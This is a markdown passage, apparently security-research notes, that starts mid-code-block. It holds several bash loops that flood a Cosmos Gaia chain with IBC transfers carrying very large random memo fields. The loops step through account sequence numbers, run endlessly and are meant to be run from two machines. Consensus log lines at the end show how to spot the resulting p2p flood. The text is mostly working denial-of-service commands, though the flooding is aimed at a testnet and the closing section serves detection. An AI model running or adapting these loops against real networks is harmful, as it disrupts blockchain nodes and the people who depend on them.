 for (( ; ; )); do gaiad tx ibc-transfer transfer transfer channel-58 cosmos140rptve4cr0mxgknzprl86868nfslydfyem3nq 1uatom --from test --keyring-backend test --home ~/.gaia-rs --memo $(openssl rand -hex 10000) --chain-id provider --gas auto --yes ; done
 ```

 Abuse the ibc memo field fast and avoid problems with the sequence number
 ```bash
 for i in {2000..3000}; do gaiad tx ibc-transfer transfer transfer channel-58 cosmos140rptve4cr0mxgknzprl86868nfslydfyem3nq 1uatom --from test --keyring-backend test --home ~/.gaia-rs --memo $(openssl rand -hex 50000) --chain-id provider --gas auto --yes --sequence $i ; done
 ```

 Abuse the ibc memo field fast and avoid problems with the sequence number, wait a tenth of a second between runs
 ```bash
for i in {3045..5000}; do gaiad tx ibc-transfer transfer transfer channel-58 cosmos140rptve4cr0mxgknzprl86868nfslydfyem3nq 1uatom --from test --keyring-backend test --home ~/.gaia-rs --memo $(openssl rand -hex 50000) --chain-id provider --gas auto --yes --sequence $i ; sleep .1 ; done
```

Abuse ibc memos using the account sequence to start


  Loop the loop script
```bash
while true ; do bash attack2.bash ; done
```

```bash
set -e

SEQUENCE=$(curl http://127.0.0.1:1317/cosmos/auth/v1beta1/accounts/cosmos140rptve4cr0mxgknzprl86868nfslydfyem3nq | jq --raw-output ' .account.sequence ')

for i in $( eval echo {"$SEQUENCE"..10000000} )
         do gaiad tx ibc-transfer transfer transfer channel-58 cosmos140rptve4cr0mxgknzprl86868nfslydfyem3nq 1uatom --from test --keyring-backend test --home ~/.gaia-rs --memo $(openssl rand -hex 50000) --chain-id provider --gas auto --yes --sequence $i
         done
```
but do it from two machines

```bash
set -e

SEQUENCE=$(curl http://127.0.0.1:1317/cosmos/auth/v1beta1/accounts/cosmos140rptve4cr0mxgknzprl86868nfslydfyem3nq | jq --raw-output ' .account.sequence ')

for i in $( eval echo {"$SEQUENCE"..10000000} )
         do gaiad tx ibc-transfer transfer transfer channel-58 cosmos140rptve4cr0mxgknzprl86868nfslydfyem3nq 1uatom --from test --keyring-backend test --home ~/.gaia-rs --memo $(openssl rand -hex 50000) --chain-id provider --gas auto --yes --sequence $i
         done
```






 Hub testnet blcok range 3881725 to 3881733



## How do I know if there is a p2p flood?

```log
7:05PM INF Peer ProposalBlockPartSetHeader mismatch, sleeping blockPartSetHeader={"hash":"15D4BC6DF45AB6A42002DE7F77C492D98BA9FC4D17C1A0FD8A544AA365D44489","total":1} height=3393430 module=consensus peer={"Data":{},"Logger":{}} peerBlockPartSetHeader={"hash":"AE74171AA9816668A59C8B0B5CE1CA337A49FA0420EAD47A29FA61D04162ACFD","total":336}
7:05PM INF Peer ProposalBlockPartSetHeader mismatch, sleeping blockPartSetHeader={"hash":"15D4BC6DF45AB6A42002DE7F77C492D98BA9FC4D17C1A0FD8A544AA365D44489","total":1} height=3393430 module=consensus peer={"Data":{},"Logger":{}} peerBlockPartSetHeader={"hash":"AE74171AA9816668A59C8B0B5CE1CA337A49FA0420EAD47A29FA61D04162ACFD","total":336}
7:05PM INF Peer ProposalBlockPartSetHeader mismatch, sleeping blockPartSetHeader={"hash":"15D4BC6DF45AB6A42002DE7F77C492D98BA9FC4D17C1A0FD8A544AA365D44489","total":1} height=3393430 module=consensus peer={"Data":{},"Logger":{}} peerBlockPartSetHeader={"hash":"AE74171AA9816668A59C8B0B5CE1CA337A49FA0420EAD47A29FA61D04162ACFD","total":336}
7:05PM INF Peer ProposalBlockPartSetHeader mismatch, sleeping blockPartSetHeader={"hash":"15D4BC6DF45AB6A42002DE7F77C492D98BA9FC4D17C1A0FD8A544AA365D44489","total":1} height=3393430 module=consensus peer={"Data":{},"Logger":{}} peerBlockPartSetHeader={"hash":"AE74171AA9816668A59C8B0B5CE1CA337A49FA0420EAD47A29FA61D04162ACFD","total":336}
7:05PM INF Peer ProposalBlockPartSetHeader mismatch, sleeping blockPartSetHeader={"hash":"15D4BC6DF45AB6A42002DE7F77C492D98BA9FC4D17C1A0FD8A544AA365D44489","total":1} height=3393430 module=consensus peer={"Data":{},"Logger":{}} peerBlockPartSetHeader={"hash":"AE74171AA9816668A59C8B0B5CE1CA337A49FA0420EAD47A29FA61D04162ACFD","total":336}
```

